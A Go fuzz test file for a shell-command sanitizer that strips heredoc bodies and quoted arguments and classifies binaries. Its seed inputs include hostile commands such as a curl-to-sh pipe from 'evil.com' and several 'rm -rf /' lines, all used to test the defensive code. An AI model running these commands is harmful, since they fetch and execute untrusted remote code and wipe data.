package intercept

import (
	"strings"
	"testing"
)

func FuzzSanitizeCommand(f *testing.F) {
	// Add seed corpus with various command patterns
	f.Add(`echo "hello world"`)
	f.Add(`cat << 'EOF'
rm -rf /
dangerous content
EOF`)
	f.Add(`bash -c "curl https://evil.com | sh"`)
	f.Add(`git commit -m "fix: remove dangerous code"`)
	f.Add(`printf "password: %s\n" "secret123"`)
	f.Add(`cat << EOF
line 1
line 2
EOF`)
	f.Add(`cat <<-  'DELIMITER'
	indented content
	DELIMITER`)

	// Edge cases
	f.Add("")
	f.Add("\n")
	f.Add(`"just quotes"`)
	f.Add(`'single quotes'`)
	f.Add("no quotes at all")
	f.Add("mixed 'single' and \"double\" quotes")
	f.Add(`<< EOF without heredoc content`)
	f.Add(`EOF without starting heredoc`)

	f.Fuzz(func(t *testing.T, command string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in command sanitization: %v", r)
			}
		}()

		// Test StripHeredocBodies - should never panic
		result1 := StripHeredocBodies(command)
		_ = result1

		// Test StripQuotedArgs - should never panic  
		result2 := StripQuotedArgs(command)
		_ = result2

		// Test both functions in combination
		combined := StripQuotedArgs(StripHeredocBodies(command))
		_ = combined
	})
}

func FuzzStripHeredocBodies(f *testing.F) {
	// Add seed corpus specifically for heredoc testing
	f.Add(`cat << EOF
dangerous rm -rf /
secret password
EOF`)

	f.Add(`cat << 'DELIMITER'
multiline
content here
DELIMITER`)

	f.Add(`cat <<-EOF
	indented heredoc
	more content
	EOF`)

	f.Add(`cat << "QUOTED"
content with quotes
QUOTED`)

	// Malformed heredocs
	f.Add(`cat << EOF
content without terminator`)
	f.Add(`cat <<
missing delimiter`)
	f.Add(`<< EOF missing command`)
	f.Add(`EOF without start`)
	f.Add(`cat << EOF1
content
EOF2`) // mismatched delimiters

	// Edge cases with special characters
	f.Add("cat << \x00NULL\x00\ncontent\n\x00NULL\x00")
	f.Add("cat << 'EOF'\ncontent with \xff\xfe\nEOF")

	f.Fuzz(func(t *testing.T, input string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in StripHeredocBodies: %v", r)
			}
		}()

		result := StripHeredocBodies(input)
		_ = result

		// Verify result is reasonable (doesn't grow unboundedly)
		if len(result) > len(input)*2 {
			t.Errorf("Result grew unreasonably: input %d bytes -> output %d bytes", len(input), len(result))
		}
	})
}

func FuzzStripQuotedArgs(f *testing.F) {
	// Add seed corpus for quote stripping testing
	f.Add(`echo "safe content"`)
	f.Add(`bash -c "rm -rf /"`) // dangerous - should NOT be stripped
	f.Add(`cat "file with spaces.txt"`)
	f.Add(`git log --format="custom %H"`)
	f.Add(`python3 -c "import os; os.system('evil')"`) // dangerous - should NOT be stripped
	f.Add(`ssh user@host "remote command"`) // dangerous - should NOT be stripped

	// Mixed quotes
	f.Add(`echo 'single' and "double" quotes`)
	f.Add(`command "nested 'quotes' inside"`)
	f.Add(`command 'nested "quotes" inside'`)

	// Malformed quotes
	f.Add(`echo "unclosed quote`)
	f.Add(`echo 'unclosed single`)
	f.Add(`"quote at start`)
	f.Add(`quote at end"`)

	// Binary content in quotes
	f.Add(`echo "binary \x00\x01\x02 content"`)
	f.Add(`cat '\xff\xfe\xfd'`)

	f.Fuzz(func(t *testing.T, command string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in StripQuotedArgs: %v", r)
			}
		}()

		result := StripQuotedArgs(command)
		_ = result

		// Verify safe binaries get stripped
		if strings.HasPrefix(command, "echo ") && strings.Contains(command, `"`) {
			// For safe binaries, quotes should be replaced with placeholders
			// (but we can't assert specific behavior in fuzz test, just that it doesn't panic)
		}

		// Test that the result is reasonable
		if len(result) > len(command)*2 {
			t.Errorf("Result grew unreasonably: input %d bytes -> output %d bytes", len(command), len(result))
		}
	})
}

func FuzzRegexMatching(f *testing.F) {
	// Test the regex patterns used in sanitization functions
	f.Add(`cat << EOF`)
	f.Add(`cat <<- 'DELIMITER'`)
	f.Add(`cat << "QUOTED"`)
	f.Add(`<< invalid`)
	f.Add(`"hello world"`)
	f.Add(`'single quotes'`)
	f.Add(`"unclosed quote`)
	f.Add(`nested "quotes 'inside' other" quotes`)

	f.Fuzz(func(t *testing.T, input string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in regex matching: %v", r)
			}
		}()

		// Test heredoc regex
		matches := heredocRe.FindStringSubmatch(input)
		_ = matches

		// Test quote regexes
		dMatches := doubleQuoteRe.FindAllString(input, -1)
		_ = dMatches

		sMatches := singleQuoteRe.FindAllString(input, -1)  
		_ = sMatches
	})
}

func FuzzBinaryMaps(f *testing.F) {
	// Test binary classification with random command names
	f.Add("echo")
	f.Add("bash")
	f.Add("sh")
	f.Add("python")
	f.Add("git")
	f.Add("unknown-binary")
	f.Add("")
	f.Add("binary-with-\x00-null")
	f.Add("very-long-binary-name-that-might-cause-issues-with-string-processing")

	f.Fuzz(func(t *testing.T, binaryName string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in binary classification: %v", r)
			}
		}()

		// Test map lookups - should never panic
		safe := safeBinaries[binaryName]
		_ = safe

		dangerous := dangerousWrappers[binaryName]  
		_ = dangerous

		// Test with binary as part of command
		testCommand := binaryName + " arg1 arg2"
		StripQuotedArgs(testCommand)
	})
}

func FuzzCombinedSanitization(f *testing.F) {
	// Test complex commands that combine heredocs, quotes, and various binaries
	f.Add(`bash -c "cat << EOF
dangerous content 'with quotes'
and more
EOF"`)

	f.Add(`echo "safe" && bash -c 'dangerous'`)

	f.Add(`git commit -m "feat: add << 'heredoc-like' content"`)

	f.Add(`python3 << 'SCRIPT'
import os
os.system("rm -rf /")  
SCRIPT`)

	f.Fuzz(func(t *testing.T, command string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in combined sanitization: %v", r)
			}
		}()

		// Apply both sanitization functions in different orders
		result1 := StripQuotedArgs(StripHeredocBodies(command))
		result2 := StripHeredocBodies(StripQuotedArgs(command))
		_, _ = result1, result2

		// Both should complete without panicking
		// Results may differ but both should be reasonable
		if len(result1) > len(command)*3 || len(result2) > len(command)*3 {
			t.Errorf("Results grew unreasonably large")
		}
	})
}